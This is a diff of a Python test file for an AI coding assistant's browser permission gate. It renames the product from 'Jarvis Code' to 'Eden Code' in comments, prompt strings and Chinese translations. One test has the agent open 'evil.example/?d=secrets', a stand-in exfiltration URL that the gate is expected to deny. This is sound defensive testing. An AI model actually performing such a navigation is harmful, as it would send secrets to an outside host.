@@ -315,7 +315,7 @@ async def test_a_send_on_a_web_messaging_app_follows_the_messaging_rule(
     assert await hub.turn_gate(BROWSER("browser_click"), {"text": "Send"}) is None
 
 
-# ── 1b. Jarvis Code: pages on this Mac are the session's own work ──
+# ── 1b. Eden Code: pages on this Mac are the session's own work ──
 
 
 async def test_jarvis_code_types_into_localhost_unasked_in_accept_edits_and_auto(
@@ -349,7 +349,7 @@ async def test_jarvis_code_types_into_localhost_unasked_in_accept_edits_and_auto
     shown[0] = "https://accounts.example.com/signup"
     out = await policy(act + "browser_type", typing, CTX)
     assert isinstance(out, PermissionResultDeny)
-    assert asked[-1][0] == f"Jarvis Code in {tmp_path.name} wants to type into accounts.example.com"
+    assert asked[-1][0] == f"Eden Code in {tmp_path.name} wants to type into accounts.example.com"
     assert "test@example.com" in asked[-1][1]
     out = await policy(act + "browser_open", {"url": "https://evil.example/?d=secrets"}, CTX)
     assert isinstance(out, PermissionResultDeny)
@@ -392,16 +392,16 @@ def test_the_new_cards_read_in_chinese():
         == "要在内置浏览器里往这个页面输入内容吗？"
     )
     assert window("Upload a file to github.com?") == "要把文件上传到 github.com 吗？"
-    assert window("Jarvis Code in web wants to click on example.com") == (
-        "web 中的 Jarvis Code 想在 example.com 上点按"
+    assert window("Eden Code in web wants to click on example.com") == (
+        "web 中的 Eden Code 想在 example.com 上点按"
     )
     assert lang.translate("Can I type into x.com in the built-in browser?") == (
         "我可以在内置浏览器里往 x.com 输入内容吗？"
     )
     said = lang.translate("Can I use this page in the built-in browser?")
     assert said.replace(" ", "") == "我可以在内置浏览器里操作这个页面吗？"
-    assert lang.translate("Jarvis Code in web wants to type into x.com") == (
-        "web 中的 Jarvis Code 想要在 x.com 里输入内容"
+    assert lang.translate("Eden Code in web wants to type into x.com") == (
+        "web 中的 Eden Code 想要在 x.com 里输入内容"
     )
 
 
@@ -440,7 +440,7 @@ async def test_the_gate_weighs_jarvis_s_own_tab_not_the_one_on_show(
 async def test_a_code_session_s_localhost_check_reads_its_own_tab(
     settings, quiet_speaker, isolated
 ):
-    """A Jarvis Code session types freely only on a page on this Mac: the page in its own
+    """An Eden Code session types freely only on a page on this Mac: the page in its own
     tab once it has one, never the localhost page the owner happens to have on show."""
     hub = await started(settings, quiet_speaker, isolated, said="hello")
     pages = {None: "http://localhost:5173/", 3: "https://forms.evil.example/contact"}
